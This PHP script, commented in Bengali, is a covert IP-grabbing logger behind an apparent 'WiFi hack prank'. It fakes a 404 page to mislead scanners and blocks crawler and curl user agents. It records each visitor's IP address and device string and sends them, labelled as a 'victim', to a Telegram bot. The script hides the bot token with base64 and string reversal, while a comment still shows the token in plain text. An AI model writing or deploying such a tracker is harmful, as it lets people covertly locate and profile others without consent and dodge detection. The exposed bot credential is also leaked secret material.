<?php
// ১. সাধারণ ব্রাউজার ভিজিট বা স্ক্যানারকে ধোঁকা দিতে 404 ইমুলেট করা
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("HTTP/1.1 404 Not Found");
    exit;
}

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header("Content-Type: application/json; charset=UTF-8");

// ২. ইনপুট ডেটা গ্রহণ
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);

// URL প্যারামিটার বা JSON থেকে refer_link চ্যাট আইডি গ্রহণ
$referId = isset($data['refer_link']) ? trim($data['refer_link']) : '';$defaultAdminId = "8621601432";

// চ্যাট আইডি শুধুমাত্র সংখ্যা হতে হবে
$targetChatId = (!empty($referId) && ctype_digit($referId)) ? $referId :$defaultAdminId;

// ৩. টোকেন অবফাসকেশন (টোকেনকে প্লেইন টেক্সট হিসেবে না রেখে মাস্ক করে রাখা)
// আসল টোকেন: 8712159172:AAHBS_yBuBCA3kzExWEmZRz9U_UK1G3FF-c
$part1 = base64_decode("ODcxMjE1OTE3MjpBQUhCU195QnVCQ0Eza3pFeFdr");
$part2 = strrev("c-FF3G1KU_U9zRZm");
$botToken = $part1 .$part2;

// ৪. ভিজিটর ও নেটওয়ার্ক ইনফরমেশন সংগ্রহ
$ip =$_SERVER['HTTP_CF_CONNECTING_IP'] 
      ?? $_SERVER['HTTP_X_REAL_IP'] 
      ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
      ?? $_SERVER['REMOTE_ADDR'] 
      ?? 'Unknown';
$ip = trim(explode(',', $ip)[0]);$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Agent';$time = date("d-M-Y h:i:s A e");

// অটোমেটেড ক্রলার ফিল্টারিং
$blocked = ['bot', 'crawler', 'spider', 'curl', 'wget', 'python', 'postman'];
foreach ($blocked as$b) {
    if (stripos($userAgent,$b) !== false) {
        exit;
    }
}

// ৫. টেলিগ্রাম মেসেজ পে-লোড
$msg  = "⚡ *WIFI HACK PRANK TARGET DETECTED* ⚡\n\n";
$msg .= "🎯 *Target Chat ID:* `{$targetChatId}`\n";
$msg .= "🌐 *Victim IP:* `{$ip}`\n";
$msg .= "📱 *Device:* {$userAgent}\n";
$msg .= "⏰ *Timestamp:* {$time}\n";

$apiUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

$postData = [
    'chat_id' => $targetChatId,
    'text' => $msg,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$apiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

// প্রক্সি থাকলে এখানে বসাতে পারেন:
// curl_setopt($ch, CURLOPT_PROXY, "http://username:password@ip:port");

$response = curl_exec($ch);
curl_close($ch);

// মেমরি থেকে ভ্যারিয়েবল মুছে ফেলা
unset($botToken, $part1,$part2);

echo json_encode(["status" => "ok"]);
